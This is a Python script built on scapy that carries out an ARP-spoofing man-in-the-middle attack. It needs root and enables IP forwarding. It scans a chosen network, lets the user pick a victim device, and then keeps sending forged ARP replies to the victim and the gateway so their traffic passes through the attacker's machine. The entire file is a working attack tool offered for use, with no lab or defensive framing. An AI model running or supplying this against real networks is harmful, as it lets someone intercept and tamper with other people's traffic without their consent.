from scapy.all import *
import subprocess
import ipaddress
import argparse
import time


# Verify Sudo
def in_sudo_mode():
    """If the user doesn't run the program with super user privileges, don't allow them to continue."""
    if not 'SUDO_UID' in os.environ.keys():
        print("Try running this program with sudo.")
        exit()


# IP Forwarding
def allow_ip_forwarding():
    """ Run this function to allow ip forwarding. The packets will flow through your machine, and you'll be able to capture them. Otherwise user will lose connection."""
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    # Load  in sysctl settings from the /etc/sysctl.conf file. 
    subprocess.run(["sysctl", "-p", "/etc/sysctl.conf"])


# Check connected device on Network
def network_discovery(ip_range):
    arp_responses = list()
    answered_lst = arping(ip_range, verbose=0)[0]
    for res in answered_lst:
        arp_responses.append({"ip" : res[1].psrc, "mac" : res[1].hwsrc})

    for id, res in enumerate(arp_responses):
        print("ID: {} IP: {} MAC: {}".format(id, res['ip'], res['mac']))
        
    return arp_responses


def get_interface_names():
    """The interface names of a networks are listed in the /sys/class/net folder in Kali. This function returns a list of interfaces in Kali."""
    # The interface names are directory names in the /sys/class/net folder. So we change the directory to go there.
    os.chdir("/sys/class/net")
    # We use the listdir() function from the os module. Since we know there won't be files and only directories with the interface names we can save the output as the interface names.
    interface_names = os.listdir()
    # We return the interface names which we will use to find out which one is the name of the gateway.
    return interface_names


def match_iface_name(row):
    interface_names = get_interface_names()
    for iface in interface_names:
        if iface in row:
            return iface
    return None


def get_gateway(network):
    result = subprocess.run(["route", "-n"], capture_output=True).stdout.decode().split("\n")
    gateways = []
    for iface in network:
        for row in result:
            if iface["ip"] in row:
                iface_name = match_iface_name(row)
                if iface_name is not None:
                    gateways.append({"iface": iface_name, "ip": iface["ip"], "mac": iface["mac"]})

    return gateways[0]


def attack(target, spoof):
    target_ip = target['ip']
    target_mac = target['mac']
    spoof_ip = spoof['ip']
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)


def run_main():
    in_sudo_mode()
    allow_ip_forwarding()

    parser = argparse.ArgumentParser(description="Host Discovery Script")
    parser.add_argument("-n", "--network", metavar="NETWORK", help="Scan the network to get all the hosts on it.")
    args = parser.parse_args()

    if args.network:
        devices_list = network_discovery(args.network)

        deviceID = int(input("Choose the ID of the targeted device: "))
        if deviceID == 0:
            return print("You can't choose the gateway!")
        device = devices_list[deviceID]

        gateway = get_gateway(devices_list)

        sent_packets = 0
        try:
            while True:
                attack(device, gateway)
                attack(gateway, device)
                sent_packets+=2
                print("\r[+] Sent packets: " + str(sent_packets)),
                sys.stdout.flush()
                time.sleep(2)

        except KeyboardInterrupt:
            print("\n[-] Ctrl + C detected...\nDisconnecting")

if __name__ == "__main__":
    run_main()
